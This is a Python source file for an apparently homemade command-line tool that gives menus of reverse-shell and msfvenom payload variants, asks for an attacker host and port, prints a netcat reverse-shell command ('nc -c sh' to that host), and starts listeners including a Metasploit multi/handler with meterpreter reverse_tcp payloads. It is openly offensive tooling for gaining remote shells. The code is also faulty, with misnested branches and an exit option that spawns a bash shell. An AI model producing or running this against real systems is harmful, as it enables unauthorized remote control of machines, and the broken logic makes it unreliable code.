import os 
import sys 
import time
def attack():
    payload = "[+] <reverseshell/Perl>\n"
def msfvenom():
        print("""
--------------------------------------------
             ___                       
  __ _  ___ / _/  _____ ___  ___  __ _ 
 /  ' \(_-</ _/ |/ / -_) _ \/ _ \/  ' \\
/_/_/_/___/_/ |___/\__/_//_/\___/_/_/_/
                                       

1# Windows/Meterpreter/Staged/Reverse/TCP/x64
2# Windows/Meterpreter/Staged/Reverse/TCP/x32
3# Windows/Meterpreter/Stageless/Reverse/TCP/x64
4# Windows/Meterpreter/Stageless/Reverse/TCP/x32
5# Windows/Staged/Reverse/TCP/x64
6# Windows/Staged/Reverse/TCP/x32
7# Windows/Stageless/Reverse/TCP/x64
8# Windows/Stageless/Reverscode e/TCP/x32
9# Linux/Meterpreter/Staged/Reverse/TCP/x64
10# Linux/Meterpreter/Staged/Reverse/TCP/x86
11# Linux/Stageless/Reverse/TCP/x64
12# Linux/Stageless/Reverse/TCP/x86
13# Windows/Bind/TCP/ShellCode/BOF
14# macOS/Meterpreter/Staged/Reverse/TCP/x64
15# macOS/Meterpreter/Stageless/Reverse/TCP/x64
16# macOS/Stageless/Reverse/TCP/x64
17# PHP/Meterpreter/Stageless/Reverse/TCP
18# PHP/Reverse/PHP 
19# JSP/Stageless/Reverse/TCP
20# WAR/Stageless/Reverse/TCP
21# Android/Meterpreter/Reverse/TCP
22# Android/Meterpreter/Embed/Reverse/TCP
23# Python/Stageless/Reverse/TCP
24# Bash/Stageless/Reverse/TCP
--------------------------------------------
  """)
def shells():
    print("""
--------------------------------------------
       __       ____  
  ___ / /  ___ / / /__
 (_-</ _ \/ -_) / (_-<
/___/_//_/\__/_/_/___/

1# Shell/sh
2# Shell/bin/sh
3# Shell/bash
4# Shell/bin/bash
5# Shell/cmd
6# Shell/powershell
7# Shell/pwsh
8# Shell/pwsh
9# Shell/ash
10# Shell/bsh
11# Shell/csh
12# Shell/ksh
13# Shell/zsh
14# Shell/pdksh
15# Shell/tcsh
--------------------------------------------
    """)
def options():
    print("""
+==========================================+
               *(options)*

    LHOST = NONE                no

    LPORT = NONE                no

    Listener = NONE             no
+==========================================+
 """)
def options2():
    print(f"""
+==========================================+
               *(options)*

    LHOST = {LHOST}            yes

    LPORT = {LPORT}            yes

    Listener = {Listener}      yes
+==========================================+
 """)
def helpbanner():
    print(f"""
 -------------------------------------
|  help ==> help banner               |                    
|  exit -y ==> exit the exploit       |
|  back ==> to go back to tool        |
|  list ==> to get reversesshells list |
|  set ==> to set the options         |  
|  list2 ==> to show Listenershells   | 
|  start ==> to start the shell       |
 ------------------------------------  
""")
def reverseshell_list():
    print("""
--------------------------------------------
                                       __       ____
  _______ _  _____ _______ ___    ___ / /  ___ / / /
 / __/ -_) |/ / -_) __(_-</ -_)  (_-</ _ \/ -_) / / 
/_/  \__/|___/\__/_/ /___/\__/__/___/_//_/\__/_/_/  
                            /___/                  
1# reverseshell/Perl
2# reverseshell/Perl/no_sh
3# reverseshell/Perl/PentestMonkey
4# reverseshell/PHP/Emoji
5# reverseshell/PHP/PentestMonkey
6# reverseshell/PHP/Ivan/Sincek
7# reverseshell/PHP/cmd
8# reverseshell/PHP/exec
9# reverseshell/PHP/shell_exec
10# reverseshell/PHP/system
11# reverseshell/PHP/passthru
12# reverseshell/PHP `
13# reverseshell/PHP/popen
14# reverseshell/PHP/proc/open
15# reverseshell/Windows/ConPty
16# reverseshell/PowerShell_1
17# reverseshell/PowerShell_2
18# reverseshell/PowerShell_3
19# reverseshell/PowerShell/TLS
20# reverseshell/PowerShell/Base64
21# reverseshell/Python_1
22# reverseshell/Python_2
23# reverseshell/Python3_1
24# reverseshell/Python3_2
25# reverseshell/Python3_Windows
26# reverseshell/Python3_shortest
27# reverseshell/Ruby_1
28# reverseshell/Ruby/no_sh
29# reverseshell/socat_1
30# reverseshell/socat_2
31# reverseshell/node.js
32# reverseshell/node.js_2
33# reverseshell/Java_1
34# reverseshell/Java_2
35# reverseshell/Java_3
36# reverseshell/Javascript
37# reverseshell/Groovy
38# reverseshell/telnet
39# reverseshell/zsh
40# reverseshell/Lua_1
41# reverseshell/Lua_2
42# reverseshell/Golang
43# reverseshell/Vlang
44# reverseshell/Awk
45# reverseshell/Dart
46# reverseshell/Bash -i
47# reverseshell/Bash/196
48# reverseshell/Bash/read_line
49# reverseshell/Bash_5
50# reverseshell/Bash_udp
51# reverseshell/nc_mkfifo
52# reverseshell/nc -e
53# reverseshell/nc_exe -e 
54# reverseshell/nc -c 
55# reverseshell/ncat -e 
56# reverseshell/ncat_exe -e 
57# reverseshell/ncat_udp
58# reverseshell/rustcat
59# reverseshell/C
60# reverseshell/C/Windows
61# reverseshell/C#/TCP/Client
62# reverseshell/C#/Bash -i
63# reverseshell/Haskell_1
--------------------------------------------
    """)
def Listenershell():
    print("""
--------------------------------------------
   __   _     __                        __       ____  
  / /  (_)__ / /____ ___  ___ ____ ___ / /  ___ / / /__
 / /__/ (_-</ __/ -_) _ \/ -_) __/(_-</ _ \/ -_) / (_-<
/____/_/___/\__/\__/_//_/\__/_/__/___/_//_/\__/_/_/___/
                             /___/                     
1# Listener/nc
2# Listener/ncat
3# Listener/ncat/TLS
4# Listener/rlwrap/nc
5# Listener/socat
6# Listener/socat/TTY
7# Listener/powercat
8# Listener/msfconsole
--------------------------------------------
    """)
exin_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","set","shellslist"]
#+
Listener_list = ["Listener/nc","Listener/ncat","Listener/ncat/TLS","Listener/rlwrap/nc","Listener/socat","Listener/socat/TTY","Listener/powercat","Listener/msfconsole"]
#=#+
shell_list = ["sh","/bin/sh","bash","/bin/bash","cmd","powershell","pwsh","ash","bsh","csh","ksh","zsh","pdksh","tcsh"]
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/nc -c\033[1;34m) > \033[1;32m")
        if exin in exin_commands:
                pass
        if exin not in exin_commands:
            print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
            pass
        elif exin == "help":
                helpbanner()   
                pass
        elif exin == "exit":
                    print("[+] please type exit -y to go out the tool")
                    pass
        elif exin == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")    
        elif exin == "clear":
                    os.system("clear")    
                    pass
        elif exin == "list": 
                reverseshell_list()
                pass
        elif exin == "list2":
            Listenershell()
            pass
        elif exin == "back":
                os.system("python3 /etc/reverseshells/reverseshell.py")
        elif exin == "show options":
                    options()
                    pass
        elif exin == "shellslist":
            shells()
            pass
        elif exin == "start":
            print("please set first:")
            pass
        elif exin == "set":
            LHOST = input("set your local host: ")
        while LHOST == "":
                        time.sleep(0.5)
                        print("please type LHOST")
                        LHOST = input("set your local host: ")
    #+
        LPORT = input("set your local port: ")
        while LPORT == "":
                        time.sleep(0.5)
                        print("please type LPORT")
                        LPORT = input("set your local port: ")
    #+
        Listener = input("set Listener shell: ")
        while Listener == "":
                        time.sleep(0.5)
                        print("please type Listener shell")
                        Listener = input("set Listener shell: ")
        if Listener not in Listener_list:
                    print("type any of this")
                    time.sleep(1.4)
                    Listenershell()
                    Listener = input("set Listener shell: ")
        if Listener in Listener_list:
                print("done !")
                time.sleep(0.3)
                break
    except:
        attack()
exin2_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","reset"]
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/nc -c\033[1;31m)> \033[1;32m")
                    if exin2 not in exin2_commands:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
                        pass
                        if exin2 in exin2_commands:
                            pass
                    elif exin2 == "back":
                        os.system("python3 /etc/reverseshells/reverseshell.py")
                    elif exin2 == "show options":
                                    options2()
                                    pass
                    elif exin2 == "list":
                                reverseshell_list()
                                pass
                    elif exin2 == "list2":
                            Listenershell()
                            pass
                    elif exin2 == "exit":
                        print("please type exit -y to get out")
                        pass
                    elif exin2 == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")
                    elif exin2 == "reset":
                        attack()
                    elif exin2 == "clear":
                                os.system("clear")
                                pass
                    elif exin2 == "help":
                            helpbanner()
                            pass
                    elif exin2 == "":
                        pass
                    elif exin2 == "start":
                                break
timer2 = time.strftime("%Y-%m-%d %H:%M:%S")
timer = time.strftime("%H:%M:%S")
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mcheck the shell".format(timer,))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLHOST ==> {}              yes".format(timer,LHOST))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLPORT ==> {}              yes".format(timer,LPORT))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mListener ==> {}        yes".format(timer,Listener))
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with nc")
time.sleep(1)
print(f"""
\033[1;32mnc -c sh {LHOST} {LPORT}
""")
time.sleep(3)
if Listener == "Listener/nc":
        time.sleep(0.5)
        print("starting Listener/nc")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"nc -lvnp {LPORT}")
#######################ncat################ ####################
if Listener == "Listener/ncat":
        time.sleep(0.5)
        print("starting Listener/ncat")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"ncat -lvnp {LPORT}")
#######################ncat_TLS################################
if Listener == "Listener/ncat/TLS":
            time.sleep(0.5)
            print("starting Listener/ncat/TLS")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"ncat --ssl -lvnp {LPORT}")
#######################rlwrap_nc###############################
if Listener == "Listener/rlwrap/nc":
                time.sleep(0.5)
                print("starting Listener/rlwrap/nc")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"rlwrap -cAr nc -lvnp {LPORT}")
#######################socat###################################
if Listener == "Listener/socat":
                    time.sleep(0.5)
                    print("starting Listener/socat")
                    time.sleep(0.2)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    os.system(f"socat -d -d TCP-LISTEN:{LPORT} STDOUT")
#######################socat_TTY###############################
if Listener == "Listener/socat/TTY":
                time.sleep(0.5)
                print("starting Listener/socat/TTY")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{LPORT}")
#######################powercat################################
if Listener == "Listener/powercat":
            time.sleep(0.5)
            print("starting Listener/powercat")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"powercat -l -p {LPORT}")
######################msfconsole###############################
msfconsole_commands = ["windows","linux","php","java","android"]
windows_linux = ["x64","x32"]
if Listener == "Listener/msfconsole":
        time.sleep(0.5)
        print("we have some options for this Listener")
        time.sleep(0.5)
        Listener_options = input("can you set here operating system for multi/handler : ")
        while Listener_options not in msfconsole_commands:
                print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options}")
                Listener_options = input("can you set here operating system for multi/handler : ")
                if Listener_options in msfconsole_commands:
                    print("")
        if Listener_options == "linux":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of linux: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of linux: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin = "msfconsole -q -x "f"'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin_2 = "msfconsole -q -x "f"'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin_2)
        if Listener_options == "windows":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of windows: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of windows: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win = "msfconsole -q -x "f"'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win_2 = "msfconsole -q -x "f"'use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win_2)
                if Listener_options == "php":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_php = "msfconsole -q -x "f"'use multi/handler; set payload php/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_php)
                    if Listener_options == "java":
                        time.sleep(0.5)
                        print("okay !")
                        time.sleep(0.5)
                        print("starting Listener/msfconsole")
                        time.sleep(0.3)
                        print("happy hacking :>")
                        time.sleep(3)
                        print("you are now ready")
                        print(f"the session was started in ==> [{timer2}]")
                        msfconsole_java = "msfconsole -q -x "f"'use multi/handler; set payload java/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                        os.system(msfconsole_java)
                        if Listener_options == "android":
                            time.sleep(0.5)
                            print("okay !")
                            time.sleep(0.5)
                            print("starting Listener/msfconsole")
                            time.sleep(0.3)
                            print("happy hacking :>")
                            time.sleep(3)
                            print("you are now ready")
                            print(f"the session was started in ==> [{timer2}]")
                            msfconsole_android = "msfconsole -q -x "f"'use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                            os.system(msfconsole_android)
